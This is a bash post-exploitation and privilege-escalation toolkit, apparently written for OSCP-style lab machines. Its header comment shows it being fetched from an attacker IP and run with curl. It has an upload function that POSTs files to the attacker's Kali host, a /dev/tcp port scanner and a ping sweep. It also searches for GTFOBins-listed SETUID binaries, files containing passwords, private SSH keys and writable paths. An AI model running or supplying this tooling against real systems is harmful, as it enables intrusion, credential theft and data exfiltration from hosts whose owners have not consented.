#!/bin/bash
#
# . <(curl 10.10.10.10/recon.sh)
#

IP_KALI="{IP_KALI}"

#------------------------------------------------------
#  * Available functions *
#-------------------------------------------------------
function recon.help(){
    echo """
 [*] Auxiliar Environment tools:
    - aux.upload [file]               : Send files to http server via post
    - aux.download [file]             : Perform GET to fetch files

 [*] Recon Environment tools
    - recon.dateScan                  : Files modified between two dates
    - recon.dateLast                  : Files modified less than 15min ago
    - recon.dateSuspicious            : Suspicious timestamp binaries (IPPSEC)
    - recon.portscan <host> [1-1024]  : Perform port scanning
    - recon.pingscan 10.10.10.        : Perform /24 subnet ping scan
    - recon.pspy                      : Simple process monitor

 [*] General recon:
    - recon.sys                       : System information
    - recon.users                     : Local user information
    - recon.programs                  : Recent installed packages information
    - recon.process                   : Current processes information
    - recon.networks                  : Network information

 [*] Privesc tools:
    - priv.setuid                     : Search for SETUID binaries
    - priv.capabilities               : Search for present capabilities
    - priv.writable                   : Search for manipulable locations
    - priv.search.fname               : Search files with name passwd 
    - priv.search.fcontent            : Search files with passwd content
    - priv.search.sshkeys             : Search potential ssh files
    - priv.crontabs                   : Search for crontabs 
    """
}



#------------------------------------------
#  *   Upload files via http POST  *
#------------------------------------------
function aux.upload {
	if [[ $# -ne 1  ]]; then
		echo ""
		echo " [>] Upload file:"
		echo "        aux.upload <File>"
		return
	fi
    filename=$(basename "$1")
    wget --post-file=$1 -O /dev/null --header="Content-Disposition: attachment; filename="$filename $IP_KALI 
}


#------------------------------------------
#  * Download files via http POST *
#------------------------------------------
function aux.download {
	if [[ $# -ne 1  ]]; then
		echo ""
		echo " [>] Download file:"
		echo "        aux.download <File>"
		return
	fi
	wget "$IP_KALI/$1"
}


#------------------------------------------
#  * Search files modified 15 minutes ago *
#------------------------------------------
function recon.dateLast(){
	find / -type f -mmin -15 -exec ls -la {} \; 2>/dev/null | grep -v proc
}


#------------------------------------------
#  * Search files between two dates *
#------------------------------------------
function recon.dateScan(){
	if [[ $# -ne 2  ]]; then
		echo ""
		echo " [>] Report between two dates:"
		echo "        dan.dateScan 2020-01-01 2020-02-01"
		return
	fi

	dat1=$1
	dat2=$(date --date="$dat1 + 1 day" +"%Y-%m-%d")

	while [[ "$dat1" < "$2" ]];do
		echo ""
		echo "------------------------------------------------"
		echo -e "\e[102m            $dat1 <-> $dat2           \e[0m"
		echo "------------------------------------------------"

		find / -type f -newermt $dat1 ! -newermt $dat2 -exec ls -la {} \; 2>/dev/null

		#Add one more day
		dat1=$dat2
		dat2=$(date --date="$dat1 + 1 day" +"%Y-%m-%d")
	done
}


#------------------------------------------
#  * Executables with suspicious date *
#------------------------------------------
function recon.dateSuspicious(){
	for i in $(echo $PATH | tr ":" "\\n"); do ls -la --time-style=full $i | grep -v "000000\\|->";done
}


#------------------------------------------
#  * Port Scanner *
#------------------------------------------
function recon.portscan() {
    local ip=$1
    local port_range=${2:-"1-1024"}

    # Verify that host is provided
    if [ -z "$ip" ]; then
        echo ""
        echo " [>] Port Scanner:"
        echo "        recon.portscan <host> [1-1024]"
        return
    fi

    IFS='-' read -r start_port end_port <<< "$port_range"

    for port in $(seq "$start_port" "$end_port"); do
        (echo >/dev/tcp/$ip/$port) &>/dev/null && echo "     [>] Port $port is open!"
    done
}


#------------------------------------------
#  * Ping Scan /24 subnet *
#------------------------------------------
function recon.pingscan() {
    local ip=$1

    # Verify that host is provided
    if [ -z "$ip" ]; then
        echo ""
        echo " [>] Net Ping Scan:"
        echo "        recon_pingscan 192.168.0."
        return
    fi

    for i in {1..225}; do
        current_ip="$ip$i"
        if ping -c 1 -W 1 "$current_ip" &>/dev/null; then
            echo "$current_ip: Responding"
        fi
    done
}


#------------------------------------------
#  System Information
#------------------------------------------
function recon.sys {
	echo ""
    echo " [*] System Information:"
	echo " -------------------------------------"
	echo " Hostname: $(hostname)"
	echo " Kernel: $(uname -a)"
	echo " Uptime: $(uptime -p)"
	echo ""
	echo " [*] CPU Information:"
	echo " -------------------------------------"
	echo " CPU Model: $(grep "model name" /proc/cpuinfo | head -n1 | cut -d':' -f2 | tr -s ' ')"
	echo " CPU Cores: $(grep "^processor" /proc/cpuinfo | wc -l)"
	echo ""
	echo " [*] Memory Information:"
	echo " -------------------------------------"
	echo " Total Memory: $(free -h | awk '/^Mem:/ {print $2}')"
	echo " Used Memory:  $(free -h | awk '/^Mem:/ {print $3}')"
	echo ""
	echo " [*] Disk Information:"
	echo " -------------------------------------"
	df -h | awk '$NF=="/" {print " Root Disk: Total=" $2 ", Used=" $3 ", Free=" $4}'
	echo ""
	echo " GPU Information:"
	echo " -------------------------------------"
	echo " $(lspci | grep -i "vga\|3d")"
	echo ""
}


#------------------------------------------
#  Information about system users and groups
#------------------------------------------
function recon.users {
	echo ""
    echo " ##############################################################"
    echo "                   Active System Users"
    echo " ##############################################################"
	while IFS=: read -r username _ uid _ _ hom term; do
    if [ "$uid" -ge 1000 ] && [ "$uid" -ne 65534 ]; then
        echo "   [>] $username \tHome: $hom \tTerm: $term"
        echo "         Groups:"
        echo -n "       " ;groups $username | cut -d ' ' -f3- | xargs -n1 echo -n " "
        echo ""
    fi
	done < /etc/passwd
}


#------------------------------------------
#  Recently Installed Packages
#------------------------------------------
function recon.programs {
	echo ""
    echo " ##############################################################"
    echo "        Last 100 Installed Packages on the System"
    echo " ##############################################################"
	echo ""
    grep " install " /var/log/dpkg.log* | sed 's/^[^:]*://g' | sort | tail -n100
    echo ""
}


#------------------------------------------
#  System Process Information
#------------------------------------------
function recon.process {
	echo ""
	ps auxf | grep -vE "\[.*\]" | cut -c 1-$(tput cols)
	echo ""
}


#------------------------------------------
#  Network Information
#------------------------------------------
function recon.networks {
	echo ""
    echo "##############################################################"
    echo "                Open Ports on the Machine"
    echo "##############################################################"
	ss -tupln
	echo ""
    echo "##############################################################"
    echo "                     Network Interfaces"
    echo "##############################################################"
    ip addr
	echo ""
    echo "##############################################################"
    echo "                       Routing Table"
    echo "##############################################################"
    route
}


#------------------------------------------
#  pspy-like Auxiliary Program
#------------------------------------------
function recon.pspy() {
	echo ""
    echo "##############################################################"
    echo "         Monitoring New Processes on the Machine"
    echo "##############################################################"
    while true; do
        processes=$(ps -eo command --sort=start_time | grep -vE "\[.*\]" | grep -v tail | tail -n +2)
        sleep 0.2
        processes2=$(ps -eo command --sort=start_time | grep -vE "\[.*\]" | grep -v tail | tail -n +2)
        diff <(echo "$processes") <(echo "$processes2") | grep "^>"
    done
}


#------------------------------------------
#  SETUID Programs
#------------------------------------------
function priv.setuid {
	#Programs from GFOBins
	keywords=("aa-exec" "ab" "agetty" "alpine" "ar" "arj" "arp" "as" "ascii-xfr" "ash" "aspell" "atobm" "awk"
          "base32" "base64" "basenc" "basez" "bash" "bc" "bridge" "busybox" "bzip2" "cabal" "capsh" "cat"
          "chmod" "choom" "chown" "chroot" "clamscan" "cmp" "column" "comm" "cp" "cpio" "cpulimit" "csh"
          "csplit" "csvtool" "cupsfilter" "curl" "cut" "dash" "date" "dd" "debugfs" "dialog" "diff" "dig"
          "distcc" "dmsetup" "docker" "dosbox" "ed" "efax" "elvish" "emacs" "env" "eqn" "espeak" "expand"
          "expect" "file" "find" "fish" "flock" "fmt" "fold" "gawk" "gcore" "gdb" "genie" "genisoimage"
          "gimp" "grep" "gtester" "gzip" "hd" "head" "hexdump" "highlight" "hping3" "iconv" "install"
          "ionice" "ip" "ispell" "jjs" "join" "jq" "jrunscript" "julia" "ksh" "ksshell" "kubectl" "ld.so"
          "less" "logsave" "look" "lua" "make" "mawk" "minicom" "more" "mosquitto" "msgattrib" "msgcat"
          "msgconv" "msgfilter" "msgmerge" "msguniq" "multitime" "mv" "nasm" "nawk" "ncftp" "nft" "nice"
          "nl" "nm" "nmap" "node" "nohup" "od" "openssl" "openvpn" "pandoc" "paste" "perf" "perl" "pexec"
          "pg" "php" "pidstat" "pr" "ptx" "python" "rc" "readelf" "restic" "rev" "rlwrap" "rsync" "rtorrent"
          "run-parts" "rview" "rvim" "sash" "scanmem" "sed" "setarch" "setfacl" "setlock" "shuf" "soelim"
          "softlimit" "sort" "sqlite3" "ss" "ssh-agent" "ssh-keygen" "ssh-keyscan" "sshpass"
          "start-stop-daemon" "stdbuf" "strace" "strings" "sysctl" "systemctl" "tac" "tail" "taskset"
          "tbl" "tclsh" "tee" "terraform" "tftp" "tic" "time" "timeout" "troff" "ul" "unexpand" "uniq"
          "unshare" "unsquashfs" "unzip" "update-alternatives" "uudecode" "uuencode" "vagrant" "view"
          "vigr" "vim" "vimdiff" "vipw" "w3m" "watch" "wc" "wget" "whiptail" "xargs" "xdotool" "xmodmap"
          "xmore" "xxd" "xz" "yash" "zsh" "zsoelim")
	echo ""
    echo "##############################################################"
    echo "                      SETUID Programs"
    echo "##############################################################"
    setuids=$(find / -perm -4000 -type f ! -path "/dev/*" -printf "%T@ %Tc %p\n" 2>/dev/null | sort -n | awk '{$1=""; print $0}')
	echo "$setuids" | while IFS= read -r line; do
	  binary_name=$(echo "$line" | awk '{print $NF}' | xargs basename)
	  out="$line"
	  for keyword in "${keywords[@]}"; do
	    if [[ "$binary_name" == "$keyword" ]]; then
	      out="\033[1;31m$line\033[0m"
	      break
	    fi
	  done
	  echo -e "$out"
	done
	}


#------------------------------------------
#      Programs with Capabilities
#------------------------------------------
function priv.capabilities {
	echo ""
    echo "##############################################################"
    echo "                Programs with Capabilities"
    echo "##############################################################"
	/usr/sbin/getcap -r / 2>/dev/null
}


#------------------------------------------
#  User-Writable Directories
#------------------------------------------
function priv.writable {
	echo ""
    echo "##############################################################"
    echo "                 User-Writable Locations"
    echo "##############################################################"
	find / -writable -type f ! -path "/proc/*" ! -path "/dev/*" ! -path "/run/*" ! -path "/sys/*" 2>/dev/null
}


#------------------------------------------
#  Files by Password-Like Name
#------------------------------------------
function priv.search.fname {
	echo ""
    echo "##############################################################"
    echo "               Files with 'passw' on name"
    echo "##############################################################"
    find . -type f \( -name "*.config" -o -name "*.conf" -o -name "*passw*" \)  -printf "%T@ %Tc %p\n" 2>/dev/null | sort -n | awk '{$1=""; print $0}'
}


#------------------------------------------
#  Files that May Contain Passwords
#------------------------------------------
function priv.search.fcontent {
	echo ""
    echo "##############################################################"
    echo "             Files Containing 'passw' word"
    echo "##############################################################"
    find . -type f \( -name "*.dll" -o -name "*.so" -o -name "*.js" \) -prune -o -exec grep -i -l "passw" {} \; 2>/dev/null | xargs ls -lt --time=at
}


#------------------------------------------
#  Potential SSH Key Files
#------------------------------------------
function priv.search.sshkeys {
    echo ""
    echo "##############################################################"
    echo "                       SSH Key Files"
    echo "##############################################################"
    find . -type f -exec grep -l '^-----BEGIN \(RSA\|DSA\|EC\|OPENSSH\) PRIVATE KEY-----' {} \; 2>/dev/null | xargs ls -lt --time=at
}


#------------------------------------------
#  System Crontabs
#------------------------------------------
function priv.crontabs {
	echo ""
    echo "##############################################################"
    echo "              Scheduled Tasks on the System"
    echo "##############################################################"
    ls -la /etc/cron*
	echo ""
    echo "##############################################################"
    echo "                Scheduled Tasks in General"
    echo "##############################################################"
    cat /etc/crontab
	echo ""
    echo "##############################################################"
    echo "          Search in syslog for Scheduled Tasks"
    echo "##############################################################"
    grep "CRON" /var/log/syslog 2>/dev/null | tail -n 50
}


#------------------------------------------
#  Additional Function to Display Banner
#------------------------------------------
function banner {
	echo "

     ___  __    ___   ___                            
    /___\/ _\  / __\ / _ \  _ __ ___  ___ ___  _ __  
   //  //\ \  / /   / /_)/ | '__/ _ \/ __/ _ \| '_ \  
  / \_// _\ \/ /___/ ___/  | | |  __/ (_| (_) | | | |
  \___/  \__/\____/\/      |_|  \___|\___\___/|_| |_|
                                                     
 ========================================================
                                             DannyDB@~>
 "
}


#------------------------------------------
#  Additional Function to Execute Tree
#------------------------------------------
function tree {
    local directory=./
    echo ""
    echo "Directories: $directory"
    echo "----------------------------------"
    find "$directory" -type f | sed -e "s;^$directory;/;" | awk -F'/' '{for (i=2;i<NF;i++) printf "  "; print "|--", $NF}'
    echo ""
}


#------------------------------------------
#  Some Aliases
#------------------------------------------
alias ll='ls -lh --group-dirs=first --color=auto'


banner
recon.help